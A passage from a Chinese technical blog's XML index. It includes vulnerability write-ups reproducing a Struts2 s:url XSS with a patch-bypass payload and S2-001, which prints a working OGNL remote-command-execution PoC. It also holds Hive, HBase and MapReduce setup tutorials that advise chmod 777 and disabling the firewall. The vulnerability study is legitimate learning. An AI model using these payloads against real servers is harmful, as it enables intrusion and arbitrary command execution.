%&gt;。引入标签配置。该配置在struts2-core核心jar包中,META-INF/struts-tags.tld对struts2标签进行了定义。比如我们本次使用的&lt;s:url&gt;&lt;tag-class&gt;org.apache.struts2.views.jsp.URLTag&lt;/tag-class&gt;说明了标签的具体实现类为org.apache.struts2.views.jsp.URLTag在本例中&lt;s:url&gt;标签在xss_test.jps中，jsp的本质也是一个Servlet，在执行jsp的时候tomcat会将其转化为java代码，当struts2在解析到标签时，实际上是继承了http servlet中可扩展的BodyTagSupport类。然后依次执行12345doStartTag()setBodyContent()doInitBody()doAfterBody()doEndTag() 我们从doStartTag方法下断开始跟踪。使用payload访问localhost:8080/test_war_exploded/Xss.action?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;=boogle在doStartTag方法中通过gettBean()方法获取URL组件,然后通过populateParams()方法对获取的URL组件中属性进行赋值。然后执行this.component.start(this.pageContext.getOut())方法，即前面提到的URL组件的start方法。跟进该方法首先会判断&lt;s:url&gt;标签中设置的includeParams参数，该属性有三个值：none get all，默认值为get。属性值为get时，该url会将访问其所在jsp的的请求的所有get方法的参数添加到自身来 ，属性值为all时更是将get和post的的参数值全部添加到自身来，属性值为none时不添加。本例中我们设置的参数值为all，之后便进入到includeParams值为all的流程，执行mergeRequestParameters方法。跟进在该方法中取到我们的payload，并保存在parameters中。然后回到URL组件的start方法中，继续执行进入到includeGetParameters方法。该方法中使用extractQueryString方法获得参数信息，该方法会直接调用HttpServletRequest的getQueryString的方法直接获取浏览器发送的请求信息。之后又调用UrlHelper.parseQueryString(query)以&amp;为分隔符将获取的请求信息分隔出不同的参数。将参数保存在queryParams在该过程中会对参数的value值使用translateAndDecode编码处理，而不会对参数name进行任何处理。然后继续执行进入mergeRequestParameters将参数名称和值保存到parameters中。至此doStartTag工作完成，然后进入到doEndTag方法然后进入end方法，实现对标签的内容渲染工作。 0x03 补丁分析1234567891011121314151617//if the action was not explicitly set grab the params from the request if (escapeAmp) &#123; buildParametersString(params, link); &#125; else &#123; buildParametersString(params, link, "&amp;"); &#125; String result = link.toString(); while (result.indexOf("&lt;script&gt;") &gt; 0) &#123; result = result.replaceAll("&lt;script&gt;", "script"); &#125; try &#123; result = encodeResult ? response.encodeURL(result) : result; &#125; catch (Exception ex) &#123; // Could not encode the URL for some reason // Use it unchanged result = link.toString(); &#125; 补丁使用while循环对&lt;script&gt;进行去除，仍可使用&lt;script boogle&gt;样式绕过。payload1"&gt;&lt;script boogle&gt;alert(1)&lt;/script&gt;=boogle 0x04 参考Struts2标签原理分析https://www.iflym.com/index.php/code/resolve-error-codec-problem-while-use-s-url-or-s-a-on-struts2.html]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>struts2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7配置安装HIVE]]></title>
    <url>%2FCentos7%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85HIVE%2F</url>
    <content type="text"><![CDATA[0x00 前言Hive是一个数据仓库基础工具在Hadoop中用来处理结构化数据。它架构在Hadoop之上，总归为大数据，并使得查询和分析方便。并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。引自https://www.yiibai.com/hive/ 本次在安装hadoop基础上配置安装HIVE数据仓库。Hadoop安装教程参考Centos7搭建Hadoop伪分布式集群详细步骤 0x01 配置安装HIVE下载首先下载HIVE,为了与Hadoop3.2.0,我选择的hive版本为3.1.1 配置环境变量下载完成后进行解压，根据解压目录自行配置环境变量12vi .bashrc //配置环境变量source .bashrc //使配置生效 修改配置文件移动到HIVE安装目录下的conf文件夹执行1234567cp hive-env.sh.template hive-env.sh cp hive-default.xml.template hive-site.xml cp hive-log4j2.properties.template hive-log4j2.properties cp hive-exec-log4j2.properties.template hive-exec-log4j2.properties 修改hive-env.sh,添加JAVA_HOME,HADOOP_HOME及HIVE配置文件目录，请根据自己环境自行修改如下 Schema初始化执行schematool -initSchema -dbType derby执行成功效果如下如果执行failed，修改hive-3.1.1/scripts/metastore/upgrade/derby目录下的hive-schema-2.1.0.derby.sql按下图将框中内容使用注释符--注释重新执行schematool -initSchema -dbType derby 启动HIVESchema初始化成功后即可启动hive，命令hive启动成功如下，如出现报错，请移至文末0x03 问题解决查看笔者记录部分问题解决方法 0x02 HIVE命令详细命令参考Hive常用命令 0x03 问题解决expansion character问题解决方法：修改报错的hive-site.xml,将报错位置3210行第96个字符删掉 ${system:xxx}路径错误问题出现该问题的主要原因是hive配置文件中不能使用冒号目录定义方法，可将其直接修改为目录。如配置文件中用${system:java.io.tmpdir}定义的路径改为/tmp/,${system:user.name}定义的路径改为${user.name}，其他类似可使用cat -n hive-site.xml |grep system:定位到出现问题的位置]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
        <tag>hive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java代码审计入门之s2-001复现分析]]></title>
    <url>%2Fjava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-001%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 前言入门JAVA代码审计的第一篇文章，还是决定以漏洞之王struts2下手，本篇即以学习为目的，复现分析S2-001,虽然该漏洞已过去十多年，但是前前后后还是折腾了好几天。 0x01 环境搭建官方给出的漏洞影响版本为WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8。本例中使用struts-2.0.1版本进行复现分析。 工具选择使用了IDEA，下面记录一下如何使用IDEA创建第一个struts2项目。IDEA需下载Ultimate版本,Community版本无法创建Java EE工程。首先New Project创建Struts2项目，Libraries选择Set up library later下一步之后填写项目名称即可创建起一个struts2 project下载struts-2.0.1-all 在项目目录WEB-INF下新建lib文件夹，将所需要的jar包从下载目录中导入到lib文件夹下 将全部jar包选中，右键Add as Library填写一个Library Name然后File-&gt;Project strutsure然后在Modules下选中struts2-001之后再在Artifacts如下图将struts2-001put into output root，完成后点击OK.之后按下图创建Tomcat server在配置页面点击Fix,其他默认即可。至此即可看到一个struts2项目启动成功。因为漏洞是在表单验证失败时发生的，这里继续编写一个表单验证的Demo，以复现漏洞。在WEB目录下修改index.jsp123456789101112131415&lt;%@ page contentType="text/html; charset=UTF-8" %&gt;&lt;%@ taglib prefix="s" uri="/struts-tags" %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Sign On&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;s:form action="Login"&gt; &lt;s:textfield label="username" name="username"/&gt; &lt;s:textfield label="password" name="password" /&gt; &lt;s:submit/&gt;&lt;/s:form&gt;&lt;/body&gt;&lt;/html&gt; 然后新建welcome.jsp123456789101112&lt;%@ page contentType="text/html; charset=UTF-8" %&gt;&lt;%@ taglib prefix="s" uri="/struts-tags" %&gt;&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt; &lt;title&gt;S2-001&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 在src下新建com.demo.actionpackage1234567891011121314151617181920212223242526272829303132333435package com.demo.action;import com.opensymphony.xwork2.ActionSupport;public class Login extends ActionSupport &#123; private String username = null; private String password = null; public String getUsername() &#123; return this.username; &#125; public String getPassword() &#123; return this.password; &#125; public void setUsername(String username) &#123; this.username = username; &#125; public void setPassword(String password) &#123; this.password = password; &#125; public String execute() &#123; if ((this.username.isEmpty()) || (this.password.isEmpty())) &#123; return "error"; &#125; if ((this.username.equalsIgnoreCase("admin")) &amp;&amp; (this.password.equals("admin"))) &#123; return "success"; &#125; return "error"; &#125;&#125; 修改struts.xml123456789101112&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE struts PUBLIC "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN" "http://struts.apache.org/dtds/struts-2.0.dtd"&gt;&lt;struts&gt; &lt;package name="s2" extends="struts-default"&gt; &lt;action name="Login" class="com.demo.action.Login"&gt; &lt;result name="success"&gt;welcome.jsp&lt;/result&gt; &lt;result name="error"&gt;index.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 之后即可运行程序出现登陆Demo 0x02 代码分析在分析之前还是看一下十多年前官方的描述看到问题是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。第一次分析JAVA代码，还是觉得无从下断分析，但是既然是OGNL表达式导致的问题，那么表达式必然会经过OGNL解析并返回结果，前辈们给出的分析思路便是在OGNL表达式原生API getValue处下断点，该方法用于解析OGNL表达式并返回表达式的值。下断后便可发送payload%{1+1}，直到在断点处出现我们的payload,此时在调用栈中即可看到漏洞发生的整个过程。然后便可以根据调用栈开始分析过程。首先我们的payload是从index.jsp输入的，这里需要了解的是jsp的本质也是一个Servlet，在执行jsp的时候tomcat会将其转化为java代码，比如这里index.jsp被转化为index_jsp.java。之后struts便会调用ComponentTagSupport类中doStartTag doEndTag方法对index_JSP.hava中的struts标签进行处理。上图可以看出，调用doEndTag方法对标签时会调用this.component.end()方法。跟进之后在UIBean类中end方法中会继续调用同类下的evaluateParams跟进evaluateParams，该方法会对标签属性取得name之后判断是否开启altSyntax功能，开启则会用%{}将标签属性值名称包裹，用于使用OGNL表达式对其处理。1altSyntax 功能是 Struts 2 框架用于处理标签内容的一种新语法（不同于普通的 HTML ），该功能主要作用在于支持对标签中的 OGNL 表达式进行解析并执行。该功能在struts2核心配置文件struts.properties中默认开启。 然后username经过上面处理之后，进入到该类下的getValue方法查询表达式的值，继续跟进。在该方法中调用TextParseUtil.translateVariables。之后调用了该类下的同名方法translateVariables，对OGNL表达式进行了递归处理，从而使得我们的payload可以在递归处理时被OGNL表达式执行。继续查看该方法，便可以看到使用了while(true)对表达式进行了递归处理。之后便对表达式去掉%{}调用stack.findValue即OgnlValueStack类下的findValue，并最终调用了Ognl的getValue方法对表达式进行取值在getValue中可以看到取到了我们的payload之后取得的值复制给o并最终复制给expression，继续在while循环中被处理。最终在OGNL表达式中被处理，获得计算结果2。 0x03 漏洞利用POC1%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"whoami"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 修改new java.lang.String[]{&quot;whoami&quot;}即可执行任意命令 如需参数可这样利用new java.lang.String[]{&quot;net&quot;,&quot;user&quot;} 0x04 补丁分析在XWork2.0.4增加了loopCount判断以取消对OGNL的递归解析 0x05 参考S2-001漏洞分析OGNL设计及使用不当造成的远程代码执行漏洞Struts-001远程代码执行漏洞分析]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>struts2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoop之Hbase架构环境搭建及使用JAVA API远程连接]]></title>
    <url>%2FHadoop%E4%B9%8BHbase%E6%9E%B6%E6%9E%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8JAVA%20API%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[0x00 前言Hbase全称为Hadoop Database，是一个分布式的存储系统。Hbase使用Hadoop的HDFS作为其文件存储系统，使用Hadoop的MapReduce来处理Hbase中的海量数据，使用zookeeper作为其协调工具。 查看本教程之前，请确保已安装配置好Hadoop，可参考Centos7搭建Hadoop伪分布式集群详细步骤,使用Hadoop JAVA API 远程连接HDFS 0x01 下载安装下载首先在官网下载Hbase选择对应版本的bin文件，国内根据推荐的清华源下载即可。linux下可使用wget命令下载，我下载的为2.1.4版本1wget http://mirrors.tuna.tsinghua.edu.cn/apache/hbase/2.1.4/hbase-2.1.4-bin.tar.gz 解压下载后即可解压到目录,我这里直接在当前目录解压1tar -zxvf hbase-2.1.4-bin.tar.gz 配置环境变量进入解压后的目录使用pwd命令查看路径然后修改.bashrc配置环境变量 12345vi ~/.bashrc在最后添加export HBASE_HOME=/home/wzb/hbase-2.1.4export PATH=$PATH:$HBASE_HOME/bin保存后退出 然后使用source ~/.bashrc命令使配置生效然后输入命令hbase可看到环境变量配置成功 0x02 启动Hbase在启动hbase之前。首先进行相应的配置修改 配置hbase-env.sh修改hbase所在目录下的conf目录的hbase-env.sh如我的位置为/home/wzb/hbase-2.1.4/conf/hbase-env.sh首先配置环境变量export JAVA_HOME=/usr/local/java/jdk1.8.0_201,此处修改为你的java环境变量，如不知道，可通过echo $JAVA_HOME查看然后配置export HBASE_MANAGES_ZK=true,使用其自带的zookeeper 配置hbase-site.xml然后继续配置conf目录下的hbase-site.xml123456789101112131415161718192021222324252627&lt;configuration&gt; &lt;property&gt; &lt;name&gt;hbase.rootdir&lt;/name&gt; &lt;value&gt;hdfs://192.168.111.147:9000/hbase&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.zookeeper.quorum&lt;/name&gt; &lt;value&gt;192.168.111.147&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.cluster.distributed&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.zookeeper.property.dataDir&lt;/name&gt; &lt;value&gt;/home/wzb/Hbase/zookeeper/tmp&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.unsafe.stream.capability.enforce&lt;/name&gt; &lt;value&gt;false&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.wal.provider&lt;/name&gt; &lt;value&gt;filesystem&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 注意标识处根据自己环境修改 下载htrace-core-3.1.0-incubating.jar下载htrace-core-3.1.0-incubating.jar并移至hbase安装目录下的lib文件夹 启动start-hbase.sh配置修改好后即可通过start-hbase.sh命令启动在启动之前，请先使用start-all.sh启动hadoop相关进程然后即可使用命令start-hbase.sh启动hbase通过jps可看到比刚才多出来HMaster HRegionServer HQuorumPeer三个进程，如后面出现错误可看查这些进程是否正常启动，如未启动移步文章末尾问题解决可查笔者记录的解决办法。 访问apache Hbase此处正常启动后继续然后通过浏览器访问http://192.168.111.147:16010/master-status此处ip即为你在hbase-site.xml文件中配置的ip至此Hbase启动成功。 0x03 Hbase shellhbase提供了一个shell的终端给用户交互。使用命令hbase shell进入命令界面。通过执行 help可以看到命令的帮助信息。下图列出常用命令更过命令操作可参考HBase shell 命令介绍 0x04 Java API连接Hbase修改hosts因为Hbase 16000端口绑定为127.0.0.1,所以通过其他主机无法访问，这里唯一的解决方法是修改hosts文件修改linux hostnamesudo vi /etc/sysconfig/network添加以下内容12NETWORKING=yesHOSTNAME=master 修改linux hostssu vi /etc/hosts添加以下内容 1192.168.111.147 master #此处ip添加你的linux ip,hostname填写上面修改的,我这里设置为master。 linux配置完成后需重启系统，以使配置生效。 修改windows hosts文件路径为：C:\Windows\System32\drivers\etc\hosts该文件无权限直接修改，需复制出修改完再覆盖掉最后添加一行192.168.111.147 master，同样此处应与上面相同。配置完成后即可继续下面使用java api连接，不配置可能会导致无法连接。 JAVA API关于java项目创建参见使用Hadoop JAVA API 远程连接HDFS在pom.xml中添加12345&lt;dependency&gt; &lt;groupId&gt;org.apache.hbase&lt;/groupId&gt; &lt;artifactId&gt;hbase-client&lt;/artifactId&gt; &lt;version&gt;1.2.4&lt;/version&gt;&lt;/dependency&gt; 将Hbase-site.xml添加到项目中，如下图新建HBase类，内容如下1234567891011121314151617181920212223242526272829303132333435363738package hadoop;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.hbase.HBaseConfiguration;import org.apache.hadoop.hbase.HColumnDescriptor;import org.apache.hadoop.hbase.HTableDescriptor;import org.apache.hadoop.hbase.TableName;import org.apache.hadoop.hbase.client.Admin;import org.apache.hadoop.hbase.client.Connection;import org.apache.hadoop.hbase.client.ConnectionFactory;public class HBase &#123; public static Configuration conf; public static Connection connection; public static Admin admin; public static void main(String[] args) throws IOException &#123; conf = HBaseConfiguration.create(); conf.set("hbase.master", "192.168.111.147:16000"); connection = ConnectionFactory.createConnection(conf); admin = connection.getAdmin(); HTableDescriptor table = new HTableDescriptor(TableName.valueOf("table1")); table.addFamily(new HColumnDescriptor("group1")); //创建表时至少加入一个列组 if(admin.tableExists(table.getTableName()))&#123; admin.disableTable(table.getTableName()); admin.deleteTable(table.getTableName()); &#125; admin.createTable(table); &#125;&#125; 运行成功后成功创建table1表转到Hbase shell使用list命令可看到新表已创建 详细代码将常用hbase api封装好了，直接在main函数中调用即可。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203package hadoop;import java.io.File;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.hbase.Cell;import org.apache.hadoop.hbase.CellUtil;import org.apache.hadoop.hbase.HBaseConfiguration;import org.apache.hadoop.hbase.HColumnDescriptor;import org.apache.hadoop.hbase.HTableDescriptor;import org.apache.hadoop.hbase.TableName;import org.apache.hadoop.hbase.client.Admin;import org.apache.hadoop.hbase.client.Connection;import org.apache.hadoop.hbase.client.ConnectionFactory;import org.apache.hadoop.hbase.client.Delete;import org.apache.hadoop.hbase.client.Get;import org.apache.hadoop.hbase.client.Put;import org.apache.hadoop.hbase.client.Result;import org.apache.hadoop.hbase.client.ResultScanner;import org.apache.hadoop.hbase.client.Scan;import org.apache.hadoop.hbase.client.Table;import org.apache.hadoop.hbase.util.Bytes;public class HbaseTest &#123; public static Configuration configuration; public static Connection connection; public static Admin admin; public static void main(String[] args) throws IOException &#123; //createTable("t2", new String[] &#123; "cf1", "cf2" &#125;); listTables(); /* * insterRow("t2", "rw1", "cf1", "q1", "val1"); getData("t2", "rw1", * "cf1", "q1"); scanData("t2", "rw1", "rw2"); * deleRow("t2","rw1","cf1","q1"); deleteTable("t2"); */ &#125; // 初始化链接 public static void init() &#123; configuration = HBaseConfiguration.create(); /* * configuration.set("hbase.zookeeper.quorum", * "10.10.3.181,10.10.3.182,10.10.3.183"); * configuration.set("hbase.zookeeper.property.clientPort","2181"); * configuration.set("zookeeper.znode.parent","/hbase"); */ //configuration.set("hbase.zookeeper.property.clientPort", "2181"); //configuration.set("hbase.zookeeper.quorum", "192.168.111.151"); configuration.set("hbase.master", "192.168.111.151:16000"); File workaround = new File("."); System.getProperties().put("hadoop.home.dir", workaround.getAbsolutePath()); new File("./bin").mkdirs(); try &#123; new File("./bin/test").createNewFile(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; try &#123; connection = ConnectionFactory.createConnection(configuration); admin = connection.getAdmin(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; // 关闭连接 public static void close() &#123; try &#123; if (null != admin) admin.close(); if (null != connection) connection.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; // 建表 public static void createTable(String tableNmae, String[] cols) throws IOException &#123; init(); TableName tableName = TableName.valueOf(tableNmae); if (admin.tableExists(tableName)) &#123; System.out.println("talbe is exists!"); &#125; else &#123; HTableDescriptor hTableDescriptor = new HTableDescriptor(tableName); for (String col : cols) &#123; HColumnDescriptor hColumnDescriptor = new HColumnDescriptor(col); hTableDescriptor.addFamily(hColumnDescriptor); &#125; admin.createTable(hTableDescriptor); &#125; close(); &#125; // 删表 public static void deleteTable(String tableName) throws IOException &#123; init(); TableName tn = TableName.valueOf(tableName); if (admin.tableExists(tn)) &#123; admin.disableTable(tn); admin.deleteTable(tn); &#125; close(); &#125; // 查看已有表 public static void listTables() throws IOException &#123; init(); HTableDescriptor hTableDescriptors[] = admin.listTables(); for (HTableDescriptor hTableDescriptor : hTableDescriptors) &#123; System.out.println(hTableDescriptor.getNameAsString()); &#125; close(); &#125; // 插入数据 public static void insterRow(String tableName, String rowkey, String colFamily, String col, String val) throws IOException &#123; init(); Table table = connection.getTable(TableName.valueOf(tableName)); Put put = new Put(Bytes.toBytes(rowkey)); put.addColumn(Bytes.toBytes(colFamily), Bytes.toBytes(col), Bytes.toBytes(val)); table.put(put); // 批量插入 /* * List&lt;Put&gt; putList = new ArrayList&lt;Put&gt;(); puts.add(put); * table.put(putList); */ table.close(); close(); &#125; // 删除数据 public static void deleRow(String tableName, String rowkey, String colFamily, String col) throws IOException &#123; init(); Table table = connection.getTable(TableName.valueOf(tableName)); Delete delete = new Delete(Bytes.toBytes(rowkey)); // 删除指定列族 // delete.addFamily(Bytes.toBytes(colFamily)); // 删除指定列 // delete.addColumn(Bytes.toBytes(colFamily),Bytes.toBytes(col)); table.delete(delete); // 批量删除 /* * List&lt;Delete&gt; deleteList = new ArrayList&lt;Delete&gt;(); * deleteList.add(delete); table.delete(deleteList); */ table.close(); close(); &#125; // 根据rowkey查找数据 public static void getData(String tableName, String rowkey, String colFamily, String col) throws IOException &#123; init(); Table table = connection.getTable(TableName.valueOf(tableName)); Get get = new Get(Bytes.toBytes(rowkey)); // 获取指定列族数据 // get.addFamily(Bytes.toBytes(colFamily)); // 获取指定列数据 // get.addColumn(Bytes.toBytes(colFamily),Bytes.toBytes(col)); Result result = table.get(get); showCell(result); table.close(); close(); &#125; // 格式化输出 public static void showCell(Result result) &#123; Cell[] cells = result.rawCells(); for (Cell cell : cells) &#123; System.out.println("RowName:" + new String(CellUtil.cloneRow(cell)) + " "); System.out.println("Timetamp:" + cell.getTimestamp() + " "); System.out.println("column Family:" + new String(CellUtil.cloneFamily(cell)) + " "); System.out.println("row Name:" + new String(CellUtil.cloneQualifier(cell)) + " "); System.out.println("value:" + new String(CellUtil.cloneValue(cell)) + " "); &#125; &#125; // 批量查找数据 public static void scanData(String tableName, String startRow, String stopRow) throws IOException &#123; init(); Table table = connection.getTable(TableName.valueOf(tableName)); Scan scan = new Scan(); // scan.setStartRow(Bytes.toBytes(startRow)); // scan.setStopRow(Bytes.toBytes(stopRow)); ResultScanner resultScanner = table.getScanner(scan); for (Result result : resultScanner) &#123; showCell(result); &#125; table.close(); close(); &#125;&#125; 0x05 问题解决此处容易出现的问题为HMaster启动后闪退。可通过查看hbase安装目录下的logs文件内log日志确定该问题。 HDFS问题 首先查看hbase-wzb-master-wzb_node1.log，此处查看你的master日志文件发现9000的HDFS连接失败首先浏览器访问你的ip的9000端口，即hdfs服务，访问成功如下图如果未访问成功，查看hadoop配置文件core-site.xml查看hdfs是否正确配置为你的ip，不是请修改，确保hbase配置文件中连接的hdfs服务器与你启动的服务器路径相同。配置成功后重启hadoop，再次访问 权限问题同样查看日志问题，如发现前面配置的Hbase文件夹有权限问题，请将Hbase文件夹赋予777权限1chomd 777 Hbase //此处Hbase请添加你hbase-site.xml中配置的hbase.zookeeper.property.dataDir目录 zookeeper未正常启动问题查看hbase-wzb-regionserver-wzb_node1.log此处应修改为你的regionservelog文件出现以下错误说明zookeeper未启动成功。首先查看sudo netstat -anp | grep 2181端口是否被占用，如果占用，找到占用程序并kill掉相关进程。 防火墙问题如果出现其他端口无法访问问题，请关闭防火墙123systemctl stop firewalld.service #停止firewallsystemctl disable firewalld.service #禁止firewall开机启动 其他问题配置过程中可能出现其他各种问题，可查看log文件出现的问题并解决。]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
        <tag>hbase</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoop之MapReduce编程]]></title>
    <url>%2FHadoop%E4%B9%8BMapReduce%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[0x00 前言MapReduce是Google提出的一个软件架构，用于大规模数据集（大于1TB）的并行运算。概念“Map（映射”和“Reduce（归纳）”，及他们的主要思想，都是从函数式编程语言借来的，还有从矢量编程语言借来的特性。关于其原理，网上有很多资料，这里不细讲。笔者也仅是入门，此篇仅贴出入门的几个编程例子。 0x01 代码给出的例子使用java api,利用IDEA远程连接。代码实现了几个简单的map 及reduce例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160package hadoop;import java.io.File;import java.io.IOException;import java.util.StringTokenizer;import org.apache.commons.lang3.ObjectUtils;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.*;import org.apache.hadoop.mapreduce.*;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;import org.apache.hadoop.util.GenericOptionsParser;public class Map_reduce &#123; //统计词频 public static class TokenizerMapper extends Mapper&lt;Object, Text, Text, IntWritable&gt; &#123; private final static IntWritable one = new IntWritable(1); private Text word = new Text(); public void map(Object key, Text value, Context context ) throws IOException, InterruptedException &#123; StringTokenizer itr = new StringTokenizer(value.toString()); while (itr.hasMoreTokens()) &#123; word.set(itr.nextToken()); context.write(word, one); &#125; &#125; &#125; //统计大小写字母、数字、其他频率 public static class ZimuMapper extends Mapper&lt;Object, Text, Text, IntWritable&gt; &#123; //private final static IntWritable one = new IntWritable(1); //private Text word = new Text(); public void map(Object key, Text value, Context context ) throws IOException, InterruptedException &#123; String str = value.toString(); for(int i=0;i&lt;str.length();i++)&#123; char ch = str.charAt(i); if(ch&gt;='a'&amp;&amp;ch&lt;='z') context.write(new Text("Lowwer"),new IntWritable(1)); else if (ch&gt;='A'&amp;&amp;ch&lt;='Z')&#123; context.write(new Text("Upper"),new IntWritable(1)); &#125; else if(ch&gt;='0'&amp;&amp;ch&lt;='9') &#123; context.write(new Text("Nummer"),new IntWritable(1)); &#125; else&#123; context.write(new Text("Else"),new IntWritable(1)); &#125; &#125; &#125; &#125; //统计每个字母个数 public static class geshuMapper extends Mapper&lt;Object, Text, Text, IntWritable&gt; &#123; //private final static IntWritable one = new IntWritable(1); //private Text word = new Text(); public void map(Object key, Text value, Context context ) throws IOException, InterruptedException &#123; String str = value.toString(); for(int i=0;i&lt;str.length();i++)&#123; char ch = str.charAt(i); context.write(new Text(String.valueOf(ch)),new IntWritable(1)); &#125; &#125; &#125;//最长单词 public static class MaxworldMapper extends Mapper&lt;Object, Text, IntWritable, Text&gt; &#123; private final static IntWritable one = new IntWritable(1); private Text word = new Text(); public void map(Object key, Text value, Context context ) throws IOException, InterruptedException &#123; StringTokenizer itr = new StringTokenizer(value.toString()); while (itr.hasMoreTokens()) &#123; word.set(itr.nextToken()); context.write(one, word); &#125; &#125; &#125;// 最长词频reduce public static class MaxworldReducer extends Reducer&lt;IntWritable,Text,Text,IntWritable&gt; &#123; private IntWritable result = new IntWritable(); public void reduce(IntWritable key, Iterable&lt;Text&gt; values, Context context ) throws IOException, InterruptedException &#123; int num = 0; Text k = new Text(); for(Text val:values) &#123; if(num &lt;val.getLength()) &#123; num = val.getLength(); k= val; &#125; &#125; result.set(num); context.write(k, new IntWritable(num)); &#125; &#125;//词频统计 public static class IntSumReducer extends Reducer&lt;Text,IntWritable,Text,IntWritable&gt; &#123; private IntWritable result = new IntWritable(); public void reduce(Text key, Iterable&lt;IntWritable&gt; values, Context context ) throws IOException, InterruptedException &#123; int sum = 0; for (IntWritable val : values) &#123; sum += val.get(); &#125; result.set(sum); context.write(key, result); &#125; &#125; public static void main(String[] args) throws Exception &#123; Configuration conf = new Configuration(); String inPutPath = "hdfs://192.168.111.151:9000/user/input/"; String outPutPath = "hdfs://192.168.111.151:9000/user/output"; Job job = Job.getInstance(conf, "word count"); job.setJarByClass(Map_reduce.class); //job.setMapperClass(TokenizerMapper.class); //job.setMapperClass(ZimuMapper.class); //job.setCombinerClass(IntSumReducer.class); //job.setReducerClass(IntSumReducer.class); //选择合适的map reduce 类 job.setMapperClass(geshuMapper.class); job.setReducerClass(IntSumReducer.class); //改输出类型 //job.setMapOutputKeyClass(IntWritable.class); //ob.setMapOutputValueClass(Text.class); job.setOutputKeyClass(Text.class); job.setOutputValueClass(IntWritable.class); FileInputFormat.addInputPath(job,new Path(inPutPath)); FileOutputFormat.setOutputPath(job,new Path(outPutPath)); System.exit(job.waitForCompletion(true) ? 0 : 1); &#125;&#125;]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker网络模式详解]]></title>
    <url>%2FDocker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3%2F</url>
